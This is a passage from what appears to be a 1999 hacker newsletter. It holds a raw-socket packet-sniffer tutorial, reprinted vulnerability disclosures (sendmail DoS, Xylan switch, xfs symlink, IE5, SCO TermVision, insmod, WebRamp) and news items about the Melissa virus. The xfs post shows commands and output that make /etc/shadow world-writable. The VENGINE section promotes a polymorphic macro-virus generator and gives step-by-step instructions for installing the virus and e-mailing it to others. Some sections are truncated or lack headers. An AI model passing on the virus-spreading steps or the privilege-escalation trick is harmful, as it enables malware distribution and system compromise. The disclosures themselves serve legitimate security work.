          structures.  Byte-ordering,is the way that the operating system stores bytes in memory.
          There are two ways that this is done first with the low-order byte at the starting address
          this is known as "little-endian" or host-byte order. Next bytes can be stored with the
          high order byte at the starting address, this is called "big-endian" or network byte order.
          The Internet protocol uses >>>>>> network byte order.
           
              This is important because if you are working on an intel based linux box you will be
          programming on a little-endian machine and to send data via ip you must convert the
          bytes to network-byte order. For examle lets say we are going to store a 2-byte number
          in memory say the value is (in hex) 0x0203
       
       
          First this is how the value is stored on a big-endian machine:

                          | 02  | 03  |
                          |_____|_____| 
               address:    0       1
       
       
          And here is the same value on a little-endian machine:
       
                          ___________
                         |03   | 02  |
                         |_____|_____|
              address:    1       0
       
       
       
          The same value is being represented in both examples it is just how we order the bytes
          that changes.
       
          The next topic that you must understand is the sockaddr vs. the sockaddr_in structures.
          The struct sockaddr is used to hold information about the socket such as the family type
          and other address information it looks like :
       
               struct sockaddr {
                         unsigned short sa_family;         /*address family*/ 
                         char           sa_data[14];       /*address data*/
               };
                
               
             The first element in the structure "sa_family" will be used to reference what the family
          type is for the socket, in our sniffer it will be AF_INET. Next the "sa_data" element
          holds the destination port and address for the socket. To make it easier to deal with the
          sockaddr struct the use of the sockaddr_in structure is commonly used. Sockaddr_in 
          makes it easier to reference all of the elements that are contained by sockaddr.
       
       
          Sockaddr_in looks like:
       
       
       
          struct sockaddr_in {
                    short int          sin_family;    /* Address family               */
                    unsigned short int sin_port;      /* Port number                  */
                    struct in_addr     sin_addr;      /* Internet address             */
                    unsigned char      sin_zero[8];   /* Same size as struct sockaddr */
          };
       
       
       
       
       
       
       
             We will use this struct and declare a variable "from" which will give us the information
          on the packet that we will collect from the raw socket. For instance the var
          "from.sin_addr" will give access to the packets source address (in 
          network byte order). The thing to mention here is that all items in the sockaddr_in
          structure must be in network-byte order. When we receive the data in the sockaddr_in
          struct we must then convert it back to Host-byte order. To do this we can use some
          predefined functions to convert back and forth between  host and network byteorder.
       
          Here are the functions we will use:
       
               ntohs       : this function converts  network byte order to host byte order
                             for a 16-bit short
       
               ntohl       : same as above but for a 32-bit long
       
               inet_ntoa   : this function converts a 32-bit network binary value to a
                             dotted decimal ip address
       
               inet_aton   : converts a character string  address to the 32-bit network
                             binary value
       
               inet_addr   : takes a char string dotted decimal addr and returns a 32-bit
                             network binary value
       
          To further illustrate ,say I want to know the port number that this packet originated from:
       
               int packet_port; packet_port    =ntohs(from.sin_port);
                                                ^^^^^  
       
          If I want the source IP address of the packet we will use a special function to get it to the
          123.123.123.123 format:
       
               char *ip_addr; ip_addr  =inet_ntoa(from.sin_addr)
                                        ^^^^^^^^^
       
       line 11-12:
       
          struct ip *ip :
          struct tcp *tcp :
               
             This is a structure that we defined in our header file "headers.h". This structure is
          declared so that we can access individual fields of the ip/tcp header. The structure is like
          a transparent slide with predefined fields drawn on it. When a packet is taken off 
          the wire it is a stream of bits, to make sense of it the "transparency" (or cast) is laid on
          top of or over the bits so the individual fields can be referenced.
       
       Line 14 :
       
          sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
       
          This is the most important line in the entire program. Socket() takes three arguments in
          this form:
       
               sockfd = socket(int family, int type, int protocol);
       
       
       
               
           The first argument is the family. This could be either AF_UNIX which is used so a process
          can communicate with another process on the same host or AF_INET which is used for
          internet communication between remote hosts. In this case it will be  AF_INET . Next  
          is the type, the type is usually between 1 of 4 choices (there are others that we will not
          discuss here) the main four are :
       
          1.   SOCK_DRAM      : used for udp datagrams
          2.   SOCK_STREAM    : used for tcp packets
          3.   SOCK_RAW       : used to bypass the transport layer
                                and directly access the IP layer
       
          4.   SOCK_PACKET    : this is linux specific, it is similuar to
                                SOCK_RAW except it accesses the DATA LINK Layer
       
             For our needs we will use the SOCK_RAW type. You must have root acces to open a
           raw socket. The last parameter  is the protocol,the protocol value specifies what type of
           traffic the socket should receive , for normal sockets this value is usally set to "0"
           because the socket can figure out if for instance the "type" of SOCK_DGRAM is
           specified then the protocol should be UDP.In our case we just want to look at tcp 
           traffic so we will specify IPPROTO_TCP.
       
               
       line 15 :
          while (1)
       
         The while (1) puts the program into an infinite loop this is necessary so that after the
        first packet is processed we will loop around and grab the next. 
       
       
       Line 18:
          bytes_recieved = recvfrom(sock, buffer, sizeof buffer, 0, (struct sockaddr *)&from, &fromlen);
               
          Now here is where we are actually reading data from the open socket "sock".The from
          struct is also filled in but notice that we are casting "from" from a "sockaddr_in" struct
          to a "sockaddr" struct. We do this because the recvfrom() requires a sockaddr type but
          to access the separate fields we will continue to use the sockaddr_in structure. The 
          length of the "from" struct must also be present and passed by address. The recvfrom()
          call will return the number of bytes on success and a -1 on error and fill the global var
          errno.
       
          This is what we call "blocking-I/O" the recvfrom() will wait here forever until a
          datagram on the open socket is ready to be processed. This is opposed to 
          Non-blocking I/O which is like running a process in the background and move on to
          other tasks.
       
       
       Line 20:
          printf("Source address ::: %s\n",inet_ntoa(from.sin_addr));
       
          This printf uses the special function inet_ntoa() to take the value of "from.sin_addr"
          which is stored in Network-byte order and outputs a value in a readable ip form such
          as 192.168.1.XXX.
       
       Line 21:
          ip = (struct ip *)buffer;
       
          This is where we will overlay a predefined structure that will help us to individually
          identify the fields in the packet that we pick up from the open socket.
       
       
       Line 22:
          printf("IP header length ::: %d\n",ip->ip_length);
       
          The thing to notice on this line is the "ip->ip_length" this will access a pointer in
          memory to the ip header length the important thing to remember is that the length 
          will be represented in 4-byte words this will be more important later when trying to
          access items past the ip header such as the tcp header or the data portion of the packet.
       
       
       
       Line 23:
          printf("Protocol ::: %d\n",ip->ip_protocol);
               
          This gives access to the type of protocol such as 6 for tcp or 17 for udp.
       
       Line 24:
          tcp = (struct tcp *)(buffer + (4*ip->ip_length));
       
              Remember earlier it was mentioned that the ip header length is stored in 4 byte words,
          this is where that bit of information becomes important. Here we are trying to get access
          to the tcp header fields, to do this we must overlay a structure that has the fields
          predefined just as we did with ip. There is one key difference here the ip header fields
          were easy to access due to the fact that the beginning of the buffer was also the beginning
          of the ip header as so :
       
               
               |----------------- buffer ----------------|
                _________________________________________
               | ip header          |                    |
               |____________________|____________________|
                                    ^
                                    *ip
                                    ^
                                    *buffer
       
             So to get access to the ip header we just set a pointer casted as an ip structure to the
          beginning of the buffer like "ip = (struct ip *)buffer;". To get access to the tcp header 
          is a little more difficult due to the fact that we must set a pointer and cast it as a tcp
          structure at the beginning of the tcp header which follows the ip header in the buffer 
          as so :
       
               
                |----------------- buffer ---------------|
                 ________________________________________
                | ip header | tcp header |               |
                |___________|____________|_______________|
                            ^
                            *tcp
                               
       This is why we use 4*ip->ip_length to find the start of the tcp header.
       
       Line 25-26:
           printf("Source port ::: %d\n",ntohs(tcp->tcp_source_port);
           printf("Dest port  ::: %d\n",ntohs(tcp->tcp_dest_port));
       
          We can now access the source and dest ports which are located in the tcp header via 
          the structure as defined above.
       
       
       
       
            This will conclude  our  first very simple tcp sniffer. This was a very basic application
          that should help define how  to access packets passing on the network and how  to use
          sockets to access the packets. Hopefully this will be the first of many papers to come,
          which each proceeding paper we will add a new or more complex feature to the sniffer. I
          should also mention that there a number of great resources on the net that should aid you
          in further research in this area :
       
               1. Beej's Guide to Network Programming
                    This is an awesome paper that really helps 
                    clear up any misconceptions about network programming.

       To use the above program, cut out the above code and strip off all 
       of the line numbers. Save the edited file as sniff.c. Next cut 
       out the header file headers.h (below) and save it to a file headers.h
       in the same directory. Now just compile: gcc -o sniff sniff.c
       You should now have the executable "sniff", to run it type
       #./sniff

 10.0  Sendmail DoS on versions up to the latest version 8.9.3
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Thu, 1 Apr 1999 14:00:16 +0000

       Subject: Possible local DoS in sendmail
       
       Hi,
       It seems that sendmail ran with -t option does NOT block SIGINT ...
       In that moment while we are sending data to its stdin, when we will press
       CTRL-C process is being killed, but in queue rests unfinished letter.
       It stays there quite long - long enought to fullfill partition on disk where
       /var/spool/mqueue resides.
       When it happends, sendmail doesn't allow new connections - so it is a kind
       of DoS attack for this service.
       It has been tested on all new versions on sendmail up to current (8.9.3).
       
       Example ...

       Thanks for posting this info Lukasz.
       
       Unfortunately we believe this is just a variation on the many Denial of
       Service attacks possible from a Unix shell.  In fact, it's "yet another
       queue filling" exercise.  This problem affects most, if not all MTAs.
       
       Interestingly, the proposed DOS is less severe than the usual queue filling
       strategies such as repeatedly submitting large mails to an undeliverable
       address, such as someone@[10.255.255.255].
       
       The reason for this is that the derelict files will be removed by the next
       scheduled queue run.  In the case of legitimately queued mail, it will take
       the full queue return timeout before the queue entry is removed (assuming a
       lack of intervention on the administrator's part).
       
       The valid point you do raise is that shell-based DOS attacks are hard to
       deal with.  In many cases, the only recourse is to identify and stop the
       offender.
       
       In this case we suggest that if this attack is a possibility at your site,
       you use process accounting to help trace the malicious user.  Also, unless
       your script gets the timing exactly right every time, the queue submission
       will complete which will give more information about the identity of the
       attacker.  As a side note, setting the MaxMessageSize option prevents any
       one message from filling the queue.
       
       Having said that, it does point out that sendmail could log the username
       and queue ID earlier to help make tracing this sort of attack even easier.
       We will look into the benefits of doing this for a future release.
       
       
       Lukasz as a final point, we really appreciate you raising this issue but in
       the future, we would prefer some consultation prior to posting to bugtraq.
       This will allow us to have all of the information available at the time of
       the posting.  The address to contact us is sendmail-bugs@sendmail.org.
       
       Conclusion.  Queue filling DOS attacks are not unique to sendmail.  This is
       not a new problem.  There is no general solution to this and many other DOS
       attacks apart from identifying and stopping the malicious user.

       Hi folks,
       
       This local queue filling DoS attack in sendmail is quite dangerous. But good
       security policy (like mine) will prevent attackers from doing such things.
       Control files (in /var/spool/mqueue) created by 'sendmail -t' are owned by
       root.attacker's_group; turn on quotas for group 'attacker's_group' on the
       file system containing /var/spool/mqueue directory, and your host will be not
       vulnerable; but you _have to_ configure your sendmail as _nosuid_ daemon;
       
       Much more dangerous are remote queue filling DoS attacks. If you have enabled
       relaying, you can use shown below smdos.c proggie; it will quite fast fullfill
       partition on disk where /var/spool/mqueue resides. you should notice increased
       LA during attack; in contrast to local DoS attacks, control files created by
       smdos.c are owned by root.root, so ... it's much more difficult to prevent
       offenders from doing it;
       
       don't forget to change BSIZE definition (in smdos.c) to appropriate victim's
       host message size limitation (MaxMessageSize option); you can also increase
       MAXCONN definition.

 11.0  Xylan Omniswitch 'features' (DoS)
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Wed, 31 Mar 1999 19:12:20 +0000
       From: pmsac@TOXYN.ORG
       To: BUGTRAQ@netspace.org
       Subject: Xylan OmniSwitch "features"
       
       Sorry if this is already known.
       
       Stepped into two "features" of Xylan OmniSwitches (also works on Pizza).
       These switches are sold OEM to Alcatel (which just bought Xylan) and IBM.
       
       Number one: anyone can telnet to the switch and login, without knowing
       either user or passwod strings. No permission will be given to perform
       any command, which is not so bad.
       This could work as a DoS, because software versions until 3.1.8 (don't know
       about later ones) only allow one interactive session, displaying a message
       of "System alread in use" in other attempts. However, since you can do this
       DoS even without logging in (just sitting at the login prompt) it's not much
       of a DoS.
       
       Number two: anyone can ftp to the switch, whitout knowing either user or
       password strings. Everyone is allowed to read all files in the flash,
       and even upload files (but not remove or overwrite existing ones).
       Since reading all files gives access to SNMP community strings, this could
       be trouble, which are stored in clear text on one of the files, and writing
       files, well, just use your imagination.
       
       This was tested on software version 3.1.8 (the lastest I can access).
       
       Thanks to cock@p.ulh.as, which helped test the vulnerability.
       
       Have a nice day.
       
       Disclaimers:
       - This "feature" report was only sent here, personal option; software that's
       worth thounsands of dollars should be better beta tested;
       - I do know switches aren't generally accessible from the internet.

       Bug in xfs

       Lukasz Trabinski (lukasz@LT.WSISIZ.EDU.PL)
       Tue, 30 Mar 1999 00:14:34 +0200 
       
       Hello,
       
       I hope that's information will be useful for making new patch for
       XFree86.
       
       I found bug in xfs
       
       (Packet XFree86-xfs-3.3.3.1-1 in RedHat 5.1 and probably in RedHat 5.2
       updates, too)
       Xfs is a font server for XFree86, it's also create directory in /tmp
       That directory name .font-unix
       
       Let's make a little check:
       
       On first console (I logged as a normal user)
       
       [lukasz@lt /tmp]$ cat /etc/shadow
       cat: /etc/shadow: Permission denied
       
       [lukasz@lt /tmp]$ ls -all /etc/shadow
       -r--------   1 root     root          544 Mar 30 00:04 /etc/shadow
       
       [lukasz@lt /tmp]$ ll
       total 2
       drwxrwxrwt   2 root     root         1024 Mar 30 00:05 .
       drwxr-xr-x  18 root     root         1024 Mar 23 00:10 ..
       lrwxrwxrwx   1 lukasz   users          11 Mar 30 00:05 .font-unix ->
       /etc/shadow
       
       On second console, as root
       
       [root@lt /root]# xfs &
       [1] 2021
       [root@lt /root]# _FontTransSocketCreateListener: failed to bind listener
       _FontTransSocketUNIXCreateListener: ...SocketCreateListener() failed
       _FontTransMakeAllCOTSServerListeners: failed to create listener for local
       
       
       On first console:
       
       [lukasz@lt /tmp]$ ls -all /etc/shadow
       -rwxrwxrwt   1 root     root          544 Mar 30 00:04 /etc/shadow
       ^^^^^^^^^^^
       That's all ;)
       
       Solution, As root before run xfs, make rm -rf /tmp/.font-unix
       
       
       Sorry for my broken English ;(

       This is caused by the same bug in xc/lib/xtrans that "in.telnetd"
       <telnetd@DOEMILL.SHOCKING.COM> reported under the subject "X11R6 NetBSD
       Security Problem" last week.
       
       The patch I submitted (with stat() replaced by lstat(), as noted by
       Kevin Vajk and other) also fixes that.

       Regardless of the bug Lukasz Trabinski found in xfs -- it should
       be fixed and similar bugs traced from other software as well --
       it is not necessary to run xfs with root permissions at all.
       
       Someone may unknowingly argue that it needs to listen a port.
       Yes, but that's usually port 7100, and as it's not under 1024
       limit, so root permission isn't needed.
       
       I've run xfs for ages on separate account. below is the
       significant startup line I use in RedHat 5.x systems:
       
       daemon /bin/su fontsvr -c "/usr/X11/bin/xfs -config /etc/X11/fs/config -port 7100 &"
       
       The rule is: if a daemon can do its work with lower permissions
       than root, it should.
       
       I do also run named as nonroot permissions (Startup

       doing this as well.

       This isnt one to do blindly as it means named cannot bind to interfaces
       that appear dynamically (eg as a DNS cache on a terminal server). The
       fact that you end up having to run named as root or with the relevant
       capability to allow it to bind to low ports.

       For sure this needs to be fixed. Your "solution" introduces a race
       condition, though, if the font server is started when users are
       allowed to log on.
       
       A better interim aid is not to run xfs as root in the first place. In
       fact, why would one want to run things as root if not necessary?

       Subject: IE 5.0 allows reading and sending local files to a remote server
       
       There is a security bug in Internet Explorer 5.0, which allows reading
       and
       sending local files to a remote server.
       The problem is a bug in the DHTML edit control, which allows pasting a
       filename in a FILE object. When the form is submitted via JavaScript,
       the
       contents of the file are sent to a remote server.

       If you look under scripting options in security settings there is the option
       "Allow paste via script" simply turning this to disabled provides this
       result:
       
       <paste>
       See the contents of your file among the other stuff

       </paste>
       
       which as far as I see has disabled the reading of local files and is a
       little less drastic than disabling all JavaScript.

       There is another workaround.  In IE5, if you use the "built in" feature to
       limit scripted paste operations then the problem doesn't seem to manifest.
       
       Try the following and goto the sample implementation:
       
       Tools menu --> Internet options --> security tab --> custom level --> allow
       paste operations via script = prompt or disable

 14.0  Possible root/user level compromise in SCO TermVision
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Wed, 31 Mar 1999 16:50:13 +0100
       From: JJ Gray <nexus@PATROL.I-WAY.CO.UK>
       To: BUGTRAQ@netspace.org
       Subject: Potential vulnerability in SCO TermVision Windows 95 client
       
       
       Hi folks,
               I recently downloaded a trial version of the SCO TermVision 
       terminal emulation package for SCO Openserver 5 and Windows 95 (
       http://www.sco.com/vision/products/termvision/ ).   This comes
       in two parts, the server based binaries and the Windows 95 client,
       TermVision 2.1.   In addition to the terminal emulation you get 
       'UNIX Neighborhood' which once supplied with a hostname, username &
       password gives an explorer/X-Windows style interface to the SCO server.
       In the default configuration the hostnames, usernames & passwords are 
       saved in a file : C:\Windows\Profiles\%username%\Application
       Data\SCO\Vision\Auth\%username%.vca
       ( PC is Windows 95, NT4 server, user profiles ).  The data is encrypted
       but, not being a cryptanalysist, it took me a good 15 minutes to 
       discover the encryption is nothing more than a fixed string XOR :(
       I informed SCO of this on 30th March and received a reply the next day :)

       >From Matthew Schofield, Support <mattsc@sco.com>
       
       JJ,
       
       Thanks for highlighting this issue in the Vision Comms.
       
       By your own definition it is insecure, in that the contents of the .vca
       files can be obtained with some effort. In terms of actually using 
       someone's .vca file through the comms layer in order to access the UNIX 
       resources through a Vision product, the files can only read by the
       comms layer if the user has successfully logged into Windows as that user.
       --
       Extracted from my reply -
       
       This is of no consequence.   The point is that I can extract the UNIX
       username & password from another user that has used the same PC.
       If that user happens to use root access then I have the root password -
       thus a non privileged user with windows access can gain root privs on
       the UNIX box, whether through UNIX Neighborhood, terminal emulation,
        a terminal itself, telnet etc.   If I were a windows user with no user
       account on the UNIX box......... :)
       --
       When adding a host, the security options can be set to 'Prompt' where the
       password is not saved.   Yes this is only a potential security hole - 
       another on the 'Configuration' issue, but it is not obvious that this 
       vulnerability exists.   The default is insecure and there is no 'obvious' 
       information in the documentation that it is so - hence my post.
       Matthew finished by saying
       --
       As you have already identified, you should change the password mechanism
       for your host to prompt. In a future release we intend to either change 
       the operation of the password mechanism or add an appropriate warning.
       --
       Can't really say fairer than that I suppose...

 15.0  Linux INSMOD exploit/vulnerability
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Tue, 30 Mar 1999 22:08:13 -0500
       From: Brian Szymanski <bks10@CORNELL.EDU>
       To: BUGTRAQ@netspace.org
       Subject: linux insmod bug/security vulnerability
       
       Howdy all,
       
       Recently I discovered a bug in insmod that would require a lot of time
       and luck to exploit, but is nonetheless important for systems wanting
       rock-solid security (security shouldn't be a matter of luck). In short,
       when insmod is called without a full path to the module to load, it
       checks a small path to find the module in question. By default, this
       path is the current directory followed by the /lib/modules/ heirarchy.
       In the widely distributed versions of the software, the module is not
       checked for root ownership, and there is no way to tell which file has
       been loaded after insmod is called. Needless to say, putting a malicious
       user's code in to the kernel and then running it in kernel mode is a
       very Bad Thing.
       
       LINUX DEVELOPERS, HOWTO-WRITERS, ETC... TAKE HEED!!!
       The listed maintainer of the program, Jacques Gelinas
       (jack@solucorp.qc.ca), informs me that modprobe (not insmod) should be
       used to load pathless modules from the /lib/modules heirarchy, but in
       practice most people (and precanned scripts) use insmod, compounding the
       problem. It appears that the well distributed versions of modprobe are
       NOT vulnerable to these bugs (tested on debian 2.1). ***Please change
       any documentation you write or scripts you distribute to use modprobe
       instead of insmod ASAP*** This should probably be forwarded to some sort
       of linux development list, but I know of none at the moment.
       
       VERSIONS AFFECTED, IMPROVED (if not fixed) VERSION:
       The versions included in debian, redhat, and most if not all other
       distributions are vulnerable as well. Any version previous to 2.2.2-pre6
       (available from
       http://www.pi.se/blox/modutils/modutils-2.2.2-pre6.tar.gz). Please
       upgrade to this version, which one of the package maintainers, Bjorn
       Ekwall (bj0rn@blox.se), informs me fixes the following issues:
       
       o A module has to be owned by root.
       
       o All "path-less" modules are resolved according to the list of
         paths in conf.modules (explicitly or via the built-in defaults).
         Note that all module utilities use the same configuration
         and thus the same paths in the new release.
       
       o If insmod is called without a path to the module, insmod will
         print the full path of the module it actually selects to install.
       
       PROBLEMS IN THE NEW VERSION:
       The new version is a big improvement, but not perfect (after all, it's a
       pre-stable version...) The last 2 points appear to be implemented fine,
       but the first is imperfect. The root ownership checks only appear to
       happen when the path to the module is not specified. I don't see any
       reason why you would ever need to load a module owned by a user, when
       you can just su and copy /chown it. Also, there is some oddness when a
       module in /lib/modules isn't owned by root. insmod spits out 24(!) lines
       like this:
           insmod: /lib/modules/2.2.4/misc/vmmon is not owned by root
       That's better, but I still don't like the idea of bugs in this area of
       the code...
       
       Another thing to be wary of: There may be some unresolved issues with
       groups and permissions, but it'd probably just be bloat for this package
       to worry about warning of those issues (IE, mode  a+w modules or g+w
       with group != root). Then again, linux's swapon checks for the proper
       permissions on a swapfile/device, so perhaps it wouldn't be unreasonable
       to warn about permissions.
       
       I don't see what's so hard about just checking for ownership and
       permissions issues *after* resolving the full path of the module, but
       then again, I've been too lazy to RTFS so far, so sue me if it isn't
       that trivial.
       
       EXPLOIT:
       As previously mentioned, an exploit would require a lot of luck and
       time, but would basically consist of regularly throwing a lot of
       trojan'd .o files in /tmp, and waiting until root decides to clean out
       tmp right before loading some module... Far-fetched but too possible for
       comfort. Other scenarios along these lines could be imagined. Equally
       far fetched, but the point is the currently distributed versions don't
       do it the Right Way... It's a lot more likely that you would make your
       system crash and burn due to this bug (although files do seem to be
       checked to be in elf format before being loaded).
       
       Thanks for reading. Comments and constructive criticisms more than
       welcome:

       -----BEGIN PGP SIGNED MESSAGE-----
       
       ISS Security Advisory -- WebRamp Denial of Service Attacks
       March 31, 1999
       
       Synopsis:
       
       Ramp Networks (http://www.rampnet.com/) WebRamp Internet access devices
       allow multiple computers to share a dialup connection. The WebRamp family
       of Internet access devices are designed for small businesses that require
       cost-effective, high-speed Internet access on every desktop.
       
       WebRamp is vulnerable to two denial of service attacks that allow an
       attacker to either crash the WebRamp device or change its IP address.
       When the device crashes, it will have to be manually reset before
       it will dial up. If an attacker changes the IP address of the WebRamp,
       none of the machines on your network will be able to find it, so no
       machines will be able to access the Internet via the WebRamp. The device
       will still function as a network hub, so your intra-LAN connectivity will
       not be disrupted.
       
       
       Description:
       
       WebRamp crash/denial of service attack: Sending a specially formatted string
       of characters to the HTTP port of the WebRamp causes the device to hang,
       requiring a manual reset.
       
       WebRamp IP address change: Sending a specially-formatted UDP packet to port
       5353 changes the WebRamp's local IP address, effectively 'hiding' the
       device from the rest of your machines. The WebRamp is still connected to
       the Internet and its PPP IP address is unchanged.
       
       Recommendations:
       
       If an attacker has crashed your WebRamp, then manually reset it by turning
       it off and on again.
       
       If an attacker has changed the IP address, use WRFINDER.EXE on the WebRamp
       installation CD to change the address to a proper value.
       
       
       Fix Information:
       
       Go to http://www.rampnet.com/upgrades to get the latest firmware for your
       model of WebRamp.
       
       
       Additional Information:
       
       Information in this advisory was obtained by the research of Jon Larimer

 18.0  VENGINE - creates polymorphic variants of the melissa virus. code included.
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       VENGINE - Coded by VeggieTailz, Copyleft 1999
       
       The Vengine, combined with your favorite Microsoft Word macro virus,
       produces a polymorphic version of that virus.  Sorry kiddiez, but you
       will need rudementary VBA skillz to use this.  Instructions are included
       in the vengine.txt file, and an example is given with the Melissa virus.
       
       I had several motivations for writing this.  One, of course, was to
       demonstrate that WOMEN CAN CODE TOO, a fact often overlooked in today's
       patriarchal society.  Secondly, I was motivated by all the delightful
       publicity provided by the mass media surrounding the Melissa virus.
       Seriously, folks, no one would write viruses if the antivirus community
       didn't give them such limelight for it!  :-)  I also wanted to pedistal
       yet another egregious security hole brought to you by Microsoft.  And,
       lastly, my initial inspiration came from Nick FitzGerald's asinine
       posting to BugTraq, dated 3/29/99, in which he argues that:
       
         "By reformatting the source, you have created a new variant."
       
       Thanks to the Vengine, now every copy of the virus can be a new variant!
       
       
       Files in this archive:
       
       Polyssa.txt  - The Melissa virus modified with the Vengine
       Polyssa2.txt - A 2nd generation of Polyssa
       Vengine.txt  - The Vengine source code and usage directions
       Melissa.txt  - The original Melissa virus
       Readme.txt   - This file
       kiddiez.txt  - STEP-BY-STEP INSTRUCTIONS, FOR THE BRAINDEAD
       
       
       In closing, I would like to give a big pat-on-the-back to the drooling
       masses out there who unwittingly propogate MS-Word macro viruses.  Without
       these people, neither the virus writers nor the antivirus people would
       be in business!  Remember:  When MS-Word asks you if you want to open a
       document because it might contain virus code, JUST SAY NO.  ;->

       Okay, so you can't program even BASIC, and you just want a copy of
       the virus to play with.  Here's how:
       
       
       1. Open up Microsoft Word
       2. Press ALT-F11, which will pop up the VBA editor
       3. In the "Project" window, you'll see "Project (Document1)".
       4. Find "Microsoft Word Objects", then "ThisDocument" under that.
       5. Double-click on "ThisDocument".  Delete any text that shows up
          in the editor (on the right-hand side).
       6. Open Polyssa2.txt with Notepad.  From the "Edit" menu, chose
          "Select All", followed by "Copy".
       7. Go back to your "Microsoft Visual Basic" window, and click
          on the right-hand window again (below where it says "(General)" or
          something at the top).  Then click "Paste".
       8. Press ALT-Q to return to Microsoft Word.  Save your new document.
       9. E-mail it to all your "friends".
       10. Pat yourself on the back; you have successfully followed directions
           at least once in your miserable little life.

       NEW YORK (AP) [4.2.99] - The close-knit underground of computer virus
       creators split into two camps at the news that one of their own may have
       been arrested for releasing malicious Melissa. 
             
       ``The whole community has really been shaken up by this,'' said B.K. 
       Delong, who follows the virus scene. ``The first group is one that wants a
       better reputation. Then there's the community that wants to retaliate and
       come up with even more destructive viruses.''
             
       Virus creators gather at the Virus Exchange Underground, a computer chat
       area where they swap ideas and gossip. Most are programmers interested in
       viruses and computer bugs. They often write viruses and swap them among
       themselves, Delong said.
             
       They refer to themselves as ``Black Hats,'' interested in doing damage,
       and ``White Hats.'' The Black Hats sometimes release viruses through
       e-mail or Usenet newsgroups.
             
       In a statement released on behalf of the VX Underground, as it's often
       called, the group warned the media and investigators not to quickly
       condemn the author of Melissa.
             
       ``Instead they should be more interested in the person who released the
       bug which caused the spread of the virus,'' said the statement, which was
       e-mailed to The Associated Press.
             
       Melissa was originally posted on two sex discussion groups a week ago
       Friday, according to an online search. The VX Underground said it was
       highly unlikely those two posts out of thousands could have led to
       Melissa's vicious cascade.
             
       ``However, once released others posted the Melissa source code to
       additional newsgroups, Web sites and listservs (mailing lists), which
       meant anyone could turn it into the virus and continue to spread it,'' the
       statement continued.
             
       David L. Smith, 30, of Aberdeen, N.J., was arrested Friday and charged
       with originating the destructive Melissa, which infected hundreds of
       thousands of computers and swamped hundreds of companies' e-mail systems.
             
       Computer experts used unique identification numbers embedded in Microsoft
       Word documents to trace Melissa back to a well-known virus writer who
       calls himself VicodinES.
             
       Rita Malley, spokeswoman for the New Jersey state attorney general's
       office said Smith was ``definitely not'' the person known by that handle.
       Instead, Smith took two viruses, one of which came from VicodinES, and
       combined them with another virus to create Melissa, she said.
             
       ``They (the Black Hat programmers) are looking for someone to blame,''
       said Delong. They resent the treatment VicodinES supposedly received at
       the hands of the media, and they're rallying around their own. They said
       he is a really nice guy.''

 18.2  [ISN] The Anarchic Lure of Virus Writing ...
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       NYTIMES;

       http://www.nytimes.com/library/tech/99/04/biztech/articles/03virus.html
       <a href="http://www.nytimes.com/library/tech/99/04/biztech/articles/03virus.html">Link</a>
       
       April 3, 1999
       The Anarchic Lure of Virus Writing
       By MATT RICHTEL and JOHN MARKOFF
       
       
       In the world of cyberspace, the sport of virus writing has become the
       latter-day equivalent of the urge to write "Kilroy was here" on the wall
       of the school auditorium. And it is a hobby with a growing following. 
       
       
       The emergence of the Melissa virus a week ago, and the announcement
       yesterday of an arrest in the case, underscores the growth on the Internet
       of a community of virus writers and collectors. They freely trade
       malicious code, combine efforts to best the work of antivirus researchers,
       and post their creations on the Internet for anyone to download and
       release into the wild. 
       
       
       "It's like candy," said Sarah Gordon, an antivirus researcher for I.B.M. 
       who spent five years researching the virus-writing subculture. "A child
       can get these, a 12-year-old can get these." She said it required little
       technical expertise to introduce a virus once it was obtained. 
       
       
       "It's trivial," she said. "All you do is download it to a computer, click
       on it and there you go." 
       
       
       As the computer has become ubiquitous, the image of the bad guy of the
       technology era, the bespectacled introvert who attacks computer networks
       by keystroke, has emerged. Within this category, there exists a subset of
       virus writers, a subculture within the subculture. 
       
       
       The International Computer Security Association, an industry corporation
       based in Carlisle, Pa., estimated last year that there were 15,000 to
       20,000 viruses in circulation, with 1,000 emerging each month. Only a
       small number are widely circulated, or "make it into the wild," in the
       industry vernacular. 
       
       
       But their proliferation has given rise to a highly competitive industry of
       companies that seek out the latest strains and find and market software
       antidotes. 
       
       
       Over the years, virus writing has been perceived as having less status in
       the hacker set than cracking into government and corporate computers. But
       virus writing appears to have become more attractive to hackers as
       publicity around viruses has grown, say computer buffs and executives at
       antivirus companies. 
       
       
       One early group of virus writers, 40Hex, which published a magazine,
       emerged in the early 1990's, said Jeff Moss, the founder of Defcon, an
       annual gathering of the computer underground. "They were going to cause
       the downfall of civilization, but then they got bored after a while," 
       Moss said. 
       
       
       "There wasn't that much happening in virus writing," he added, "so the
       more motivated people went off to normal hacking." As opposed to hacking,
       which can demand a range of skill levels, virus writing traditionally
       attracted a more technically oriented set. Virus writers "are very much
       into super-down-and-dirty programming," Moss said. 
       
       
       But in recent years, virus writing has experienced a resurgence, generally
       attracting a less technically adept group. Increasingly, simple templates
       are available for use in virus writing and breaking into computers, making
       the endeavor open to copycats and less adept programmers. 
       
       
       In the underground, these copycats are known as script kiddies. In the
       world of virus writing, they are termed scripters, a name Ms. Gordon gave
       to them. 
       
       
       Ms. Gordon said virus-writing enthusiasts had evolved from the late 80's. 
       
       
       "It used to be a small group of people with these interests," she said. 
       "With the advent of the Internet, the community has widened and
       accessibility of applications to young people has increased." 
       
       
       That may have particular currency in the case of the Melissa virus. Some
       computer security experts have suggested that David L. Smith, the New
       Jersey man arrested in the case yesterday, cobbled together his own virus
       code with virus templates he found on the Web. 
       
       
       Authorities in New Jersey said they did not believe that Smith is the
       virus writer known as VicodinES, whose handle has been linked in Internet
       postings with the creation and dissemination of Melissa. What is certain
       is that VicodinES, whoever he or she is, has a Web site that advocates the
       creation and use of viruses, and that Smith's name was found in several
       documents on that Web site dating back at least a year, said Richard
       Smith, an independent software developer in Cambridge, Mass., who is an
       amateur computer sleuth. 
       
       
